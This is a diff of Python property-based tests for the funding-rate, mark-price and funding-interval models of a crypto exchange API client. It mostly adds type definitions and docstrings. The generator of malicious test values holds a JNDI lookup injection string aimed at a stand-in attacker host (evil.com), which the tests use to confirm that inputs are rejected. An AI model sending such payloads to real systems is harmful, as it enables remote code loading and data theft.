@@ -1,7 +1,7 @@
 """Property-based tests for Backpack raw funding rate models.
 
 These tests validate critical security boundary models that process external funding rate data.
-The models tested here are essential for perpetual swap trading, funding rate calculations, and mark price analysis.
+The models tested here are essential for perpetual swap trading, funding calculations, and pricing.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious funding rate data that could manipulate trading decisions
@@ -15,21 +15,56 @@ Property testing ensures comprehensive coverage of funding rate edge cases and a
 """
 
 from decimal import Decimal
-from typing import Any
+from typing import Any, TypedDict, cast
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.backpack.models.bp_raw_funding import (
+    BackpackRawFundingIntervalRate,
     BackpackRawFundingRateResponse,
     BackpackRawMarkPrice,
-    BackpackRawFundingIntervalRate,
 )
 from cyberdelta.apis.exceptions.parsing import TimestampYearRangeError
 from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import DateTimeParsingError, EmptyStringError
+
+
+# =============================================================================
+# TYPE DEFINITIONS FOR FUNDING MODEL TESTING
+# =============================================================================
+
+
+class FundingRateData(TypedDict):
+    """Type definition for funding rate response data."""
+
+    symbol: str
+    rate: str
+    markPrice: str
+    indexPrice: str
+    time: int
+
+
+class MarkPriceData(TypedDict):
+    """Type definition for mark price data."""
+
+    symbol: str
+    markPrice: str
+    fundingRate: str
+
+
+class FundingIntervalData(TypedDict):
+    """Type definition for funding interval data."""
+
+    symbol: str
+    fundingRate: str
+    intervalEndTimestamp: str
+
+
+MaliciousValue = str | int | bytes | list[str] | dict[str, str] | float | bool | None
+MaliciousDataDict = dict[str, MaliciousValue]
 
 
 # =============================================================================
@@ -38,16 +73,18 @@ from cyberdelta.exceptions.parsing import DateTimeParsingError, EmptyStringError
 
 
 def funding_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for funding rate and price fields."""
+    """Generate decimal strings for funding rate and price fields.
+
+    Returns:
+        A Hypothesis strategy for decimal strings used in funding rates and mark prices.
+    """
     return st.one_of([
         # Funding rates (typically small values)
-        st.decimals(min_value=Decimal("-1"), max_value=Decimal("1"), places=12).map(str),
+        st.decimals(min_value=Decimal(-1), max_value=Decimal(1), places=12).map(str),
         st.decimals(min_value=Decimal("-0.1"), max_value=Decimal("0.1"), places=9).map(str),
         # Mark prices (larger values)
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("10000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=6).map(
-            str
-        ),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(10000000), places=8).map(str),
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=6).map(str),
         # Common funding values
         st.just("0"),
         st.just("0.0"),
@@ -68,7 +105,11 @@ def funding_decimal_strategy() -> SearchStrategy[str]:
 
 
 def funding_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid trading symbols for funding data."""
+    """Generate valid trading symbols for funding data.
+
+    Returns:
+        A Hypothesis strategy for valid trading symbol strings.
+    """
     return st.one_of([
         # Common perpetual symbols
         st.just("BTC_USDC"),
@@ -92,7 +133,11 @@ def funding_symbol_strategy() -> SearchStrategy[str]:
 
 
 def funding_timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamp integers for funding data."""
+    """Generate valid timestamp integers for funding data.
+
+    Returns:
+        A Hypothesis strategy for valid timestamp integers.
+    """
     return st.one_of([
         # Unix timestamps (seconds)
         st.integers(min_value=1000000000, max_value=2000000000),
@@ -107,7 +152,11 @@ def funding_timestamp_strategy() -> SearchStrategy[int]:
 
 
 def funding_iso_timestamp_strategy() -> SearchStrategy[str]:
-    """Generate valid ISO timestamp strings for funding interval data."""
+    """Generate valid ISO timestamp strings for funding interval data.
+
+    Returns:
+        A Hypothesis strategy for valid ISO timestamp strings.
+    """
     return st.one_of([
         # Standard ISO formats
         st.just("2025-06-09T00:00:00"),
@@ -127,8 +176,12 @@ def funding_iso_timestamp_strategy() -> SearchStrategy[str]:
 
 
 @st.composite
-def valid_funding_rate_data(draw) -> dict[str, Any]:
-    """Generate valid funding rate response data."""
+def valid_funding_rate_data(draw: st.DrawFn) -> FundingRateData:
+    """Generate valid funding rate response data.
+
+    Returns:
+        A dictionary with valid funding rate response data fields.
+    """
     return {
         "symbol": draw(funding_symbol_strategy()),
         "rate": draw(funding_decimal_strategy()),
@@ -139,8 +192,12 @@ def valid_funding_rate_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_mark_price_data(draw) -> dict[str, Any]:
-    """Generate valid mark price data."""
+def valid_mark_price_data(draw: st.DrawFn) -> MarkPriceData:
+    """Generate valid mark price data.
+
+    Returns:
+        A dictionary with valid mark price data fields.
+    """
     return {
         "symbol": draw(funding_symbol_strategy()),
         "markPrice": draw(funding_decimal_strategy()),
@@ -149,8 +206,12 @@ def valid_mark_price_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_funding_interval_data(draw) -> dict[str, Any]:
-    """Generate valid funding interval rate data."""
+def valid_funding_interval_data(draw: st.DrawFn) -> FundingIntervalData:
+    """Generate valid funding interval rate data.
+
+    Returns:
+        A dictionary with valid funding interval rate data fields.
+    """
     return {
         "symbol": draw(funding_symbol_strategy()),
         "fundingRate": draw(funding_decimal_strategy()),
@@ -158,8 +219,12 @@ def valid_funding_interval_data(draw) -> dict[str, Any]:
     }
 
 
-def malicious_funding_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for funding security testing."""
+def malicious_funding_strategy() -> SearchStrategy[MaliciousValue]:
+    """Generate malicious values for funding security testing.
+
+    Returns:
+        A Hypothesis strategy for malicious values to test security boundaries.
+    """
     return st.one_of([
         # Financial manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-funding}"),
@@ -209,23 +274,27 @@ class TestBackpackRawFundingRateResponseProperties:
     """Property-based tests for BackpackRawFundingRateResponse validation and security."""
 
     @given(funding_data=valid_funding_rate_data())
-    def test_funding_rate_validation_success_properties(self, funding_data: dict[str, Any]) -> None:
-        """Property: Valid funding rate data should always create valid BackpackRawFundingRateResponse objects."""
+    def test_funding_rate_validation_success_properties(
+        self, funding_data: FundingRateData
+    ) -> None:
+        """Property: Valid funding rate data should always create valid response objects."""
         # Skip invalid decimal values
         try:
+            # Cast to dict for dynamic field access
+            data_dict = cast(dict[str, Any], funding_data)
             for field in ["rate", "markPrice", "indexPrice"]:
-                decimal_val = Decimal(funding_data[field])
+                decimal_val = Decimal(data_dict[field])
                 assume(decimal_val.is_finite())
         except (ValueError, TypeError):
             assume(False)
 
         # Skip invalid timestamps (out of range)
         timestamp = funding_data["time"]
-        assume(isinstance(timestamp, int) and 0 <= timestamp <= 2**31 - 1)
+        assume(0 <= timestamp <= 2**31 - 1)
 
         # Skip empty symbols
         symbol = funding_data["symbol"]
-        assume(isinstance(symbol, str) and symbol.strip())
+        assume(symbol.strip())
         assume(len(symbol.encode("utf-8")) <= 64)
 
         obj = BackpackRawFundingRateResponse.model_validate(funding_data)
@@ -250,7 +319,7 @@ class TestBackpackRawFundingRateResponseProperties:
         malicious_value=malicious_funding_strategy(),
     )
     def test_funding_rate_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousValue
     ) -> None:
         """Property: Funding rate model should reject malicious inputs safely."""
         base_data = {
@@ -260,7 +329,7 @@ class TestBackpackRawFundingRateResponseProperties:
             "indexPrice": "49999.0",
             "time": 1234567890,
         }
-        base_data[field_name] = malicious_value
+        base_data[field_name] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((
@@ -334,15 +403,17 @@ class TestBackpackRawFundingRateResponseProperties:
                 BackpackRawFundingRateResponse.model_validate(funding_data)
 
     @given(funding_data=valid_funding_rate_data())
-    def test_funding_rate_immutability_properties(self, funding_data: dict[str, Any]) -> None:
+    def test_funding_rate_immutability_properties(self, funding_data: FundingRateData) -> None:
         """Property: Funding rate objects should be immutable after creation."""
         # Skip invalid data
         try:
+            # Cast to dict for dynamic field access
+            data_dict = cast(dict[str, Any], funding_data)
             for field in ["rate", "markPrice", "indexPrice"]:
-                decimal_val = Decimal(funding_data[field])
+                decimal_val = Decimal(data_dict[field])
                 assume(decimal_val.is_finite())
-            assume(isinstance(funding_data["time"], int) and 0 <= funding_data["time"] <= 2**31 - 1)
-            assume(isinstance(funding_data["symbol"], str) and funding_data["symbol"].strip())
+            assume(0 <= data_dict["time"] <= 2**31 - 1)
+            assume(data_dict["symbol"].strip())
         except (ValueError, TypeError):
             assume(False)
 
@@ -357,7 +428,7 @@ class TestBackpackRawFundingRateResponseProperties:
 
     @given(funding_data=valid_funding_rate_data())
     def test_funding_rate_financial_precision_properties(
-        self, funding_data: dict[str, Any]
+        self, funding_data: FundingRateData
     ) -> None:
         """Property: Funding rate model should preserve financial precision exactly."""
         # Only test valid finite decimals
@@ -366,8 +437,8 @@ class TestBackpackRawFundingRateResponseProperties:
             mark_val = Decimal(funding_data["markPrice"])
             index_val = Decimal(funding_data["indexPrice"])
             assume(all(val.is_finite() for val in [rate_val, mark_val, index_val]))
-            assume(isinstance(funding_data["time"], int) and 0 <= funding_data["time"] <= 2**31 - 1)
-            assume(isinstance(funding_data["symbol"], str) and funding_data["symbol"].strip())
+            assume(0 <= funding_data["time"] <= 2**31 - 1)
+            assume(funding_data["symbol"].strip())
         except (ValueError, TypeError):
             assume(False)
 
@@ -388,19 +459,21 @@ class TestBackpackRawMarkPriceProperties:
     """Property-based tests for BackpackRawMarkPrice validation and security."""
 
     @given(mark_data=valid_mark_price_data())
-    def test_mark_price_validation_success_properties(self, mark_data: dict[str, Any]) -> None:
-        """Property: Valid mark price data should always create valid BackpackRawMarkPrice objects."""
+    def test_mark_price_validation_success_properties(self, mark_data: MarkPriceData) -> None:
+        """Property: Valid mark price data should always create valid objects."""
         # Skip invalid decimal values
         try:
+            # Cast to dict for dynamic field access
+            data_dict = cast(dict[str, Any], mark_data)
             for field in ["markPrice", "fundingRate"]:
-                decimal_val = Decimal(mark_data[field])
+                decimal_val = Decimal(data_dict[field])
                 assume(decimal_val.is_finite())
         except (ValueError, TypeError):
             assume(False)
 
         # Skip empty symbols
         symbol = mark_data["symbol"]
-        assume(isinstance(symbol, str) and symbol.strip())
+        assume(symbol.strip())
         assume(len(symbol.encode("utf-8")) <= 64)
 
         obj = BackpackRawMarkPrice.model_validate(mark_data)
@@ -423,7 +496,7 @@ class TestBackpackRawMarkPriceProperties:
         malicious_value=malicious_funding_strategy(),
     )
     def test_mark_price_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousValue
     ) -> None:
         """Property: Mark price model should reject malicious inputs safely."""
         base_data = {
@@ -431,21 +504,23 @@ class TestBackpackRawMarkPriceProperties:
             "markPrice": "50000.0",
             "fundingRate": "0.0001",
         }
-        base_data[field_name] = malicious_value
+        base_data[field_name] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
             BackpackRawMarkPrice.model_validate(base_data)
 
     @given(mark_data=valid_mark_price_data())
-    def test_mark_price_immutability_properties(self, mark_data: dict[str, Any]) -> None:
+    def test_mark_price_immutability_properties(self, mark_data: MarkPriceData) -> None:
         """Property: Mark price objects should be immutable after creation."""
         # Skip invalid data
         try:
+            # Cast to dict for dynamic field access
+            data_dict = cast(dict[str, Any], mark_data)
             for field in ["markPrice", "fundingRate"]:
-                decimal_val = Decimal(mark_data[field])
+                decimal_val = Decimal(data_dict[field])
                 assume(decimal_val.is_finite())
-            assume(isinstance(mark_data["symbol"], str) and mark_data["symbol"].strip())
+            assume(mark_data["symbol"].strip())
         except (ValueError, TypeError):
             assume(False)
 
@@ -473,9 +548,9 @@ class TestBackpackRawFundingIntervalRateProperties:
 
     @given(interval_data=valid_funding_interval_data())
     def test_funding_interval_validation_success_properties(
-        self, interval_data: dict[str, Any]
+        self, interval_data: FundingIntervalData
     ) -> None:
-        """Property: Valid funding interval data should always create valid BackpackRawFundingIntervalRate objects."""
+        """Property: Valid funding interval data should always create valid objects."""
         # Skip invalid decimal values
         try:
             decimal_val = Decimal(interval_data["fundingRate"])
@@ -485,11 +560,11 @@ class TestBackpackRawFundingIntervalRateProperties:
 
         # Skip empty symbols and timestamps
         symbol = interval_data["symbol"]
-        assume(isinstance(symbol, str) and symbol.strip())
+        assume(symbol.strip())
         assume(len(symbol.encode("utf-8")) <= 64)
 
         timestamp = interval_data["intervalEndTimestamp"]
-        assume(isinstance(timestamp, str) and timestamp.strip())
+        assume(timestamp.strip())
 
         obj = BackpackRawFundingIntervalRate.model_validate(interval_data)
 
@@ -511,7 +586,7 @@ class TestBackpackRawFundingIntervalRateProperties:
         malicious_value=malicious_funding_strategy(),
     )
     def test_funding_interval_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousValue
     ) -> None:
         """Property: Funding interval model should reject malicious inputs safely."""
         base_data = {
@@ -519,24 +594,23 @@ class TestBackpackRawFundingIntervalRateProperties:
             "fundingRate": "-0.000015513",
             "intervalEndTimestamp": "2025-06-09T00:00:00",
         }
-        base_data[field_name] = malicious_value
+        base_data[field_name] = cast(Any, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
             BackpackRawFundingIntervalRate.model_validate(base_data)
 
     @given(interval_data=valid_funding_interval_data())
-    def test_funding_interval_immutability_properties(self, interval_data: dict[str, Any]) -> None:
+    def test_funding_interval_immutability_properties(
+        self, interval_data: FundingIntervalData
+    ) -> None:
         """Property: Funding interval objects should be immutable after creation."""
         # Skip invalid data
         try:
             decimal_val = Decimal(interval_data["fundingRate"])
             assume(decimal_val.is_finite())
-            assume(isinstance(interval_data["symbol"], str) and interval_data["symbol"].strip())
-            assume(
-                isinstance(interval_data["intervalEndTimestamp"], str)
-                and interval_data["intervalEndTimestamp"].strip()
-            )
+            assume(interval_data["symbol"].strip())
+            assume(interval_data["intervalEndTimestamp"].strip())
         except (ValueError, TypeError):
             assume(False)
 
@@ -565,38 +639,36 @@ class TestBackpackRawFundingIntegrationProperties:
     )
     def test_funding_models_integration_properties(
         self,
-        funding_rate_data: dict[str, Any],
-        mark_price_data: dict[str, Any],
-        interval_data: dict[str, Any],
+        funding_rate_data: FundingRateData,
+        mark_price_data: MarkPriceData,
+        interval_data: FundingIntervalData,
     ) -> None:
         """Property: All funding models should work consistently together."""
         # Use same symbol for all models
         common_symbol = "BTC_USDC_PERP"
-        funding_rate_data["symbol"] = common_symbol
-        mark_price_data["symbol"] = common_symbol
-        interval_data["symbol"] = common_symbol
+        # Cast to dict for dynamic field assignment
+        cast(dict[str, Any], funding_rate_data)["symbol"] = common_symbol
+        cast(dict[str, Any], mark_price_data)["symbol"] = common_symbol
+        cast(dict[str, Any], interval_data)["symbol"] = common_symbol
 
         # Skip invalid data
         try:
             # Validate all decimal fields
+            # Cast to dict for dynamic field access
+            funding_dict = cast(dict[str, Any], funding_rate_data)
+            mark_dict = cast(dict[str, Any], mark_price_data)
             for field in ["rate", "markPrice", "indexPrice"]:
-                decimal_val = Decimal(funding_rate_data[field])
+                decimal_val = Decimal(funding_dict[field])
                 assume(decimal_val.is_finite())
             for field in ["markPrice", "fundingRate"]:
-                decimal_val = Decimal(mark_price_data[field])
+                decimal_val = Decimal(mark_dict[field])
                 assume(decimal_val.is_finite())
             decimal_val = Decimal(interval_data["fundingRate"])
             assume(decimal_val.is_finite())
 
             # Validate other constraints
-            assume(
-                isinstance(funding_rate_data["time"], int)
-                and 0 <= funding_rate_data["time"] <= 2**31 - 1
-            )
-            assume(
-                isinstance(interval_data["intervalEndTimestamp"], str)
-                and interval_data["intervalEndTimestamp"].strip()
-            )
+            assume(0 <= funding_rate_data["time"] <= 2**31 - 1)
+            assume(interval_data["intervalEndTimestamp"].strip())
         except (ValueError, TypeError):
             assume(False)
 
@@ -632,7 +704,7 @@ class TestBackpackRawFundingIntegrationProperties:
         )
     )
     def test_funding_models_adversarial_input_properties(
-        self, complete_malicious_data: dict[str, Any]
+        self, complete_malicious_data: MaliciousDataDict
     ) -> None:
         """Property: All funding models should safely handle complete adversarial input."""
         # Property: Complete adversarial input should be safely rejected by all models
